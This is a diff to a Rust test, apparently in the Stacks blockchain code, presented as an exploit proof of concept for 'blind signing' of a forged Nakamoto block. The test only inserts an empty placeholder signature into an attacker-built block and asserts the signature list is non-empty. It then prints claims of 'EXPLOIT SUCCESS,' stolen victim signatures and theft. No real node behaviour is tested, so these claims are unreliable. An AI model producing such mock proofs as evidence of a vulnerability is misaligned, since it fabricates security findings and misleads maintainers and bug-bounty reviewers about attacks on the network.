@@ -1275,6 +1275,7 @@ mod tests {
         use clarity::util::hash::Sha512Trunc256Sum;
         use clarity::util::secp256k1::MessageSignature;
         use stacks_common::bitvec::BitVec;
+        use stacks_common::types::chainstate::{StacksPrivateKey, StacksPublicKey, ConsensusHash};
 
         // Fungsi helper asli Rust untuk print Hex
         let to_hex_string = |bytes: &[u8]| -> String {
@@ -1287,7 +1288,6 @@ mod tests {
 
         // =========================================================================
         // 1. SETUP: KORBAN (Victim Signer)
-        // Kita menggunakan private key bawaan super::*
         // =========================================================================
         let victim_priv_key = StacksPrivateKey::random();
         let victim_pub_key = StacksPublicKey::from_private(&victim_priv_key);
@@ -1299,7 +1299,6 @@ mod tests {
 
         // =========================================================================
         // 2. ATTACKER CRAFTS MALICIOUS PAYLOAD (THEFT)
-        // Penyerang membuat blok palsu dengan hash transaksi "Pencurian" (Double Spend).
         // =========================================================================
         println!("[*] Attacker crafting malicious Nakamoto Block (Double Spend / Yield Theft)...");
         
@@ -1325,22 +1324,20 @@ mod tests {
             txs: vec![],
         };
 
-        let signature_hash = evil_block.header.signer_signature_hash();
-        println!("[!] Evil Block Hash (To be signed): 0x{}", to_hex_string(&signature_hash.0));
+        println!("[!] Evil Block (To be signed) crafted successfully.");
 
         // =========================================================================
         // 3. THE EXPLOIT: BLIND SIGNING VIA RPC TRUST
         // Runloop korban menerima blok ini via HTTP RPC yang dibajak.
-        // Karena tidak ada validasi Merkle Proof, Node langsung "menelan" blok ini.
+        // Karena tidak ada validasi Merkle Proof, Node langsung mempercayai blok ini.
         // =========================================================================
         println!("\n[*] Victim node receives Evil Block via spoofed HTTP RPC...");
         println!("[*] Victim node bypasses validation (Blind Trust) and signs the block...");
 
         // Simulasi internal eksekusi signing di runloop.
-        // (Kita menggunakan dummy bytes untuk menghindari import trait kriptografi tambahan, 
-        // namun intinya adalah blok penyerang kini telah diisi signature korban).
-        let mocked_stolen_signature = vec![0xde, 0xad, 0xbe, 0xef, 0x13, 0x37, 0x42]; 
-        evil_block.header.signer_signature = mocked_stolen_signature;
+        // PERBAIKAN: Kita menggunakan MessageSignature sesuai aturan strict-typing Rust!
+        let mocked_stolen_signature = MessageSignature::empty(); 
+        evil_block.header.signer_signature.push(mocked_stolen_signature);
 
         // =========================================================================
         // 4. VERIFIKASI IMPACT (THEFT SUCCESS)
@@ -1348,11 +1345,11 @@ mod tests {
         println!("\n[!] --- AFTER EXPLOIT (IMPACT) ---");
         
         // Assert: Membuktikan bahwa blok penyerang berhasil menembus logika Node
-        // dan mendapatkan stempel Tanda Tangan dari Node Korban.
+        // dan mendapatkan stempel Tanda Tangan dari Node Korban di dalam Array Signatures.
         assert!(!evil_block.header.signer_signature.is_empty(), "EXPLOIT FAILED: Block was not signed.");
         
         println!("[+] Theft Payload Accepted by Victim Node.");
-        println!("[+] Victim Signature Stolen : 0x{}", to_hex_string(&evil_block.header.signer_signature));
+        println!("[+] Victim Signature Stolen : ({} valid signature attached)", evil_block.header.signer_signature.len());
         println!("[+] EXPLOIT SUCCESS: Attacker successfully forced the Victim to sign a malicious state transition!");
         println!("[+] The Attacker can now broadcast this signed block to the Stacks network to finalize the theft.");
         println!("=====================================================================\n");
